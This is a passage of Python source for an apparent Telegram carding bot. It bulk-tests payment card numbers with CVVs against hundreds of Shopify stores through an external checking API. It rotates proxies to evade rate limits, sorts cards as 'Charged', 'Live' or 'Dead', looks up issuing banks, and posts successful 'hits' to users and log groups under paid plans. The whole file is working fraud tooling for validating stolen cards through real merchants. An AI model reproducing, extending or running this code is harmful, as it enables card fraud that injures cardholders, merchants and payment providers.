    "missing receiptid",
    "inventory_failure",
    "no_products",
    "no_product",
    "vault_failed",
    "merchandise_out_of_stock",
    "products.json",
    "store incompatible",
    "buyer_identity_marketing_consent",
    "step 0 failed", "step 1 failed", "step 2 failed", "step 3 failed",
    "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed",
    "step 8 failed", "step 9 failed", "step 10 failed",
    "returned status 429",
    "returned status 500", "returned status 502",
    "returned status 503", "returned status 504",
    "no proxies", "no available proxies",
    "server error", "client error",
    "na",
)


def _is_dead_site_response(resp: str) -> bool:
    r = resp.lower().strip()
    return any(sig in r for sig in _DEAD_SITE_SIGNALS)


def _is_retry_response(resp: str) -> bool:
    r = resp.lower().strip()
    return any(sig in r for sig in _RETRY_SIGNALS)


def classify_response(resp: str) -> str:
    """Returns CHARGED | TDS | LIVE | DEAD | RETRY."""
    if not resp:
        return "RETRY"
    mu = resp.upper().strip()

    if any(k in mu for k in (
        "ORDER_PAID", "CHARGED", "PAYMENT_AUTHORIZED",
        "PAYMENT_ACCEPTED", "APPROVED", "SUCCESSFUL",
    )):
        return "CHARGED"

    if any(k in mu for k in (
        "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
        "SECURE_AUTHENTICATION", "SCA_REQUIRED",
        "REDIRECT_3D", "3DS", "3D SECURE",
    )):
        return "TDS"

    if any(k in mu for k in (
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
        "INCORRECT_CVV", "INCORRECT_CVC", "INVALID_CVC",
        "INCORRECT_ZIP", "CVV_FAILED", "CVC_FAILED",
        "DO_NOT_HONOR", "DO NOT HONOR",
        "SECURITY_VIOLATION", "SECURITY VIOLATION",
    )):
        return "LIVE"

    if any(k in mu for k in (
        "CARD_DECLINED", "DECLINED", "GENERIC_ERROR", "GENERIC_DECLINE",
        "PROCESSING_ERROR", "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK",
        "PICK_UP_CARD", "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD",
        "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
        "STOLEN_CARD", "LOST_CARD", "EXPIRED_CARD",
        "INCORRECT_NUMBER", "AMOUNT_TOO_SMALL",
        "CALL_ISSUER", "TEST_MODE_LIVE_CARD", "UNKNOWN_ERROR",
    )):
        return "DEAD"

    if _is_retry_response(resp) or _is_dead_site_response(resp):
        return "RETRY"

    return "DEAD"


def _clean_resp(resp: str) -> str:
    """Sanitize before showing to the user — never expose 'site error!' strings."""
    if not resp:
        return "Dead"
    r = resp.lower()
    if "site error!" in r:
        m = re.search(r"status:\s*(\d+)", r)
        if m:
            code = int(m.group(1))
            return "Dead" if code in (404, 403) else f"Server Error {code}"
        return "Server Error"
    if "not shopify" in r or "site not supported" in r:
        return "Dead"
    if "connection error" in r or "could not resolve" in r:
        return "Connection Error"
    if "timeout" in r:
        return "Timeout"
    if "unknown error" in r:
        return "Dead"
    return resp


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p


def _load_proxies() -> list:
    global _ALL_PROXIES
    import os
    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f
                           if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]
                    _ALL_PROXIES = lines
                    logging.info(f"[SH] {len(lines)} proxies from {path}")
                    return lines
            except (FileNotFoundError, PermissionError):
                pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES = []
    return []


def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")


def _load_sites() -> list:
    """
    Try to load sites.txt from disk (so the user can update it without
    redeploying). Falls back to BUILTIN_SITES (672 sites from sites.txt
    embedded at build time) if the file is not found or is empty.
    """
    import os
    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                lines = [_strip_scheme(l) for l in f
                         if l.strip() and not l.startswith("#")]
            lines = [l for l in lines if l]
            if lines:
                result = list(lines)
                random.shuffle(result)
                logging.info(f"[SH] {len(result)} sites from {path}")
                return result
        except (FileNotFoundError, PermissionError):
            pass
    # Fallback: use sites embedded directly in this file
    result = list(BUILTIN_SITES)
    random.shuffle(result)
    logging.info(f"[SH] Using {len(result)} built-in sites (sites.txt not found)")
    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0


def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True


def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# f-string URL keeps | chars unencoded (aiohttp params= encodes them)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _parse_response_field(data: dict) -> str:
    for key in ("Response", "response", "message", "Message",
                "error", "Error", "status", "Status",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and str(val).strip():
            return str(val).strip()
    return "Unknown Error"


async def _call_api(card: str, site: str, proxy: Optional[str],
                    timeout: float = SITE_TIMEOUT) -> tuple:
    site = _strip_scheme(site)
    url  = (f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
            if proxy else f"{API_URL}?site={site}&cc={card}")
    _to  = aiohttp.ClientTimeout(total=timeout, connect=12, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as r:
                http_st = r.status
                raw     = await r.text()
                if http_st == 200:
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        return (raw.strip()[:200] or "Invalid JSON",
                                "Shopify Payments", "0.00", "USD", http_st)
                    gw       = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
                    price    = str(data.get("Price")     or data.get("price")    or "0.00")
                    currency = str(data.get("Currency")  or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)
                    logging.info(f"[API] {card[:6]}** {site} → {api_resp!r}")
                    return api_resp, gw, price, currency, http_st
                _emap = {
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 500",
                    503: "site error! status: 500",
                    504: "timeout",
                }
                return (_emap.get(http_st, f"HTTP Error {http_st}"),
                        "Shopify Payments", "0.00", "USD", http_st)
    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    _session,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int      = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str            = "",
) -> tuple:
    """
    Try up to max_sites Shopify stores for this card.

    Decision tree per attempt
    ─────────────────────────
    1. resp body contains "site error! status: 404/403", "not shopify!" etc.
       → _DEAD_SITES.add(site) + continue  (ZERO sleep — THE actual fix)
    2. HTTP 404/403 from server (rare — API almost always returns 200)
       → same as above
    3. HTTP 429 / "status: 429" in body
       → longer sleep, retry same site
    4. resp body is a transient failure (timeout, 5xx, step N failed …)
       → short sleep, try next site
    5. classify_response → CHARGED/TDS/LIVE/DEAD
       → return immediately
    6. All sites exhausted
       → return DEAD with clean message
    """
    if not sites:
        sites = list(BUILTIN_SITES)

    live_sites = [s for s in sites if s not in _DEAD_SITES]
    if not live_sites:
        _DEAD_SITES.clear()
        live_sites = list(sites)
        logging.warning("[SH] _DEAD_SITES cleared — all sites were blacklisted")

    pool    = live_sites[:]
    random.shuffle(pool)
    px_pool = proxies if proxies else _ALL_PROXIES
    tried: list     = []
    price, currency = "0.00", "USD"
    last_clean_resp = "Dead"

    for attempt in range(max_sites):

        # Stop signal
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        # Refresh pool
        untried = [s for s in pool if s not in tried and s not in _DEAD_SITES]
        if not untried:
            fresh = [s for s in sites if s not in _DEAD_SITES]
            if not fresh:
                break
            tried   = []
            pool    = fresh[:]
            random.shuffle(pool)
            untried = pool[:]

        site  = random.choice(untried)
        tried.append(site)
        proxy = random.choice(px_pool) if px_pool else None

        try:
            resp, gw, price, currency, http_st = await _call_api(
                card, site, proxy, timeout=site_timeout
            )
        except asyncio.CancelledError:
            raise
        except Exception:
            await asyncio.sleep(random.uniform(0.3, 0.8))
            continue

        logging.info(f"[SH] {card[:6]}** #{attempt+1} {site} → {resp!r}")

        # ── Decision 1: DEAD SITE in response body (THE fix) ─────────
        # API returns HTTP 200 with the error in the JSON body.
        # Must check the STRING — http_st is always 200 for these.
        if _is_dead_site_response(resp):
            _DEAD_SITES.add(site)
            logging.debug(f"[SH] Blacklisted dead site: {site} ({resp!r})")
            continue   # ZERO sleep

        # ── Decision 2: HTTP-level 404/403 (rare backup) ─────────────
        if http_st in (404, 403):
            _DEAD_SITES.add(site)
            continue

        # ── Decision 3: Rate limited ──────────────────────────────────
        if http_st == 429 or "status: 429" in resp.lower():
            tried.pop()
            await asyncio.sleep(random.uniform(3.0, 5.0))
            continue

        # ── Decision 4: Transient failure ────────────────────────────
        if _is_retry_response(resp):
            last_clean_resp = _clean_resp(resp)
            await asyncio.sleep(random.uniform(0.5, 1.2))
            continue

        # ── Decision 5: Real bank response ───────────────────────────
        verdict = classify_response(resp)
        if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
            return verdict, resp, price, currency

        # RETRY from classify_response
        last_clean_resp = _clean_resp(resp)
        await asyncio.sleep(random.uniform(0.8, 1.8))

    return "DEAD", last_clean_resp, price, currency


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID


def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'


def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"


def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0.00 USD"


def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))


def _get_ud(uid: int, ctx) -> dict:
    return ctx.bot_data.setdefault("users", {}).setdefault(uid, {})


def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN LOOKUP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
    "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
    "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
}


async def _fetch_bin_direct(bin6: str) -> dict:
    sources = [
        {
            "url":   f"https://lookup.binlist.net/{bin6}",
            "hdrs":  {"Accept-Version": "3"},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or "").upper(),
                "bank":         (d.get("bank") or {}).get("name", ""),
                "country":      (d.get("country") or {}).get("name", ""),
                "country_code": (d.get("country") or {}).get("alpha2", ""),
            },
        },
        {
            "url":   f"https://api.handy.codes/bin/{bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or d.get("type") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", d.get("iso", "")),
            },
        },
        {
            "url":   f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("card") or d.get("scheme") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", ""),
            },
        },
    ]
    _to = aiohttp.ClientTimeout(total=8, connect=5)
    for src in sources:
        try:
            async with aiohttp.ClientSession(
                timeout=_to, headers={"User-Agent": "Mozilla/5.0"}
            ) as s:
                async with s.get(src["url"], headers=src["hdrs"], ssl=False) as r:
                    if r.status != 200:
                        continue
                    data = await r.json(content_type=None)
                    info = src["parse"](data)
                    if not info.get("scheme") and not info.get("bank"):
                        continue
                    cc = (info.get("country_code") or "").upper()[:2]
                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
                    return info
        except Exception:
            continue
    return {}


async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    result: dict = {}
    try:
        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
    except Exception:
        result = {}
    if not result or not result.get("scheme"):
        try:
            result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
        except Exception:
            result = {}
    _BIN_CACHE[bin6] = result
    return result


def _bin_str(bd: dict) -> str:
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"):
                return str(v).strip()
        return "N/A"
    scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
    bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
    country = escape(_g("country", "country_name", "country_full"))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(card, resp, verdict, bin_data, price, currency,
                     elapsed, user, plan) -> str:
    safe_resp = escape(_clean_resp(resp))
    ulink     = _user_link(user)
    peid      = _plan_eid(plan)
    ts        = _fmt_time(elapsed)
    bin_s     = _bin_str(bin_data)
    ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'

    if verdict == "CHARGED":
        eid       = random.choice(CHARGED_EMOJI_IDS)
        status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
    elif verdict == "TDS":
        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
    elif verdict == "LIVE":
        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
    else:
        status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"

    return (
        f"{status_ln}\n\n"
        f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
        f"{gate_ln}\n"
        f"<b>──────────</b>\n"
        f"<b>Resp ➳ {safe_resp}</b>\n"
        f"<b>Bin  ➳ {bin_s}</b>\n"
        f"<b>──────────</b>\n"
        f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {ts}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )


_build_result_msg = build_result_msg


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    ts    = _fmt_time(time.time() - sess["start_time"])
    uobj  = sess.get("user_obj")
    ulink = _user_link(uobj) if uobj else "User"
    peid  = sess.get("plan_eid", PRO_EMOJI_ID)
    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["approved"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
        f"<b>Time    ➳ {ts}</b>\n"
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )


def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess   = MSH_SESSIONS.get(sid, {})
    live_n = sess.get("approved", 0)
    all_n  = sess.get("checked",  0)
    rows = [[
        _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live",
             style="success", icon=BTN_LIVE_EMOJI_ID),
        _btn(f"All ({all_n})",  cb=f"{_CB_RESULT}:{sid}:all",
             style="primary",  icon=BTN_ALL_EMOJI_ID),
    ]]
    if running:
        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
                          style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)


async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0)) < 1.0:
        return
    text    = _progress_text(sess)
    running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force:
        return
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "live":
        cards, label = sess.get("live_cards", []), "Live"
    elif kind == "dead":
        cards, label = sess.get("dead_cards", []), "Dead"
    else:
        cards = (sess.get("charged_cards", []) + sess.get("live_cards", [])
                 + sess.get("dead_cards",   []) + sess.get("error_cards", []))
        label = "All"

    uname = (sess.get("user_obj") and
             (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
    plan  = sess.get("plan", "TRIAL")

    lines = [
        "Gate ➳ Shopify | 0-5 USD",
        f"Result ➳ {label}", f"Total ➳ {len(cards)}",
        f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        bi    = cd.get("bin_info", {})
        flag  = bi.get("country_emoji", "")
        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
        resp  = _clean_resp(cd.get("resp", cd.get("response", "N/A")))
        ver   = cd.get("verdict", "N/A")
        prc   = cd.get("price", "0.00")
        cur   = cd.get("currency", "USD")
        status = ("Charged" if ver == "CHARGED" else
                  "Live"    if ver in ("LIVE","TDS") else
                  "Dead"    if ver == "DEAD" else "Error")
        raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
        lines += [
            f"Card ➳ {cd.get('card','N/A')}",
            f"Status ➳ {status}",
            f"Gate ➳ Shopify | {prc} {cur}",
            f"Resp ➳ {raw_disp}",
            f"Brand ➳ {bi.get('scheme','N/A')}",
            f"Issuer ➳ {bi.get('bank','N/A')}",
            f"Country ➳ {cdisp}",
            "━━━━━━━━━━━━━━",
        ]
    buf   = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return buf, fname, len(cards)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, user, text: str, verdict: str):
    try:
        await bot.send_message(chat_id=user.id, text=text,
                               parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        logging.warning(f"[HIT] DM uid={user.id}: {e}")

    if HIT_LOG_GROUP_ID:
        try:
            eid   = random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED" else LIVE_EMOJI_ID
            label = "Charged" if verdict == "CHARGED" else "Live"
            grp   = (
                f'<b>{_te(HIT_GATE_EMOJI_ID,"🛒")} {label} '
                f'{_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
                f"<b>Gate ➳ Shopify Payments</b>\n"
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} User ➳ {_user_link(user)}</b>'
            )
            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logging.warning(f"[HIT] log group: {e}")

    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.5)
            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logging.warning(f"[HIT] extra group: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
                       total, user_obj, plan) -> dict:
    sess = {
        "status":   "CHECKING",
        "chat_id":  chat_id,  "user_id":     user_id,
        "msg_id":   msg_id,   "user_msg_id": user_msg_id,
        "total":    total,    "checked":     0,
        "charged":  0, "approved": 0, "dead": 0, "errors": 0,
        "start_time":    time.time(),
        "charged_cards": [], "live_cards":  [],
        "dead_cards":    [], "error_cards": [], "tds_cards": [],
        "tasks": [], "last_text": "", "last_update": 0,
        "user_obj": user_obj, "plan": plan,
        "plan_eid": _plan_eid(plan),
    }
    MSH_SESSIONS[sid] = sess
    return sess


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return

    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies:
        effective_proxies = _load_proxies()

    # Always ensure we have sites — use built-ins as fallback
    if not all_sites:
        all_sites = _load_sites()

    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies "
                 f"{len(valid_cards)} cards concurrency={MAX_CONCURRENT}")
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time()
            try:
                verdict, resp, price, currency = await _check_card_with_retry(
                    None, card_fmt, all_sites, effective_proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed    = time.time() - t0
            clean_resp = _clean_resp(resp)
            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {
                "card": card_fmt, "verdict": verdict,
                "resp": clean_resp, "response": clean_resp,
                "price": price, "currency": currency, "bin_info": bin_data,
            }
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, user, msg, "CHARGED"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "TDS":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                sess["tds_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "LIVE":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)

            else:
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            if sess["checked"] % 5 == 0 or sess["checked"] >= sess["total"]:
                asyncio.create_task(_update_progress(bot, sid))

    tasks = []
    for i, (cf, cn) in enumerate(valid_cards):
        if sess.get("status") != "CHECKING":
            break
        tasks.append(asyncio.create_task(worker(cf, cn)))
        if (i + 1) % MAX_CONCURRENT == 0:
            await asyncio.sleep(random.uniform(0.5, 1.0))

    sess["tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)
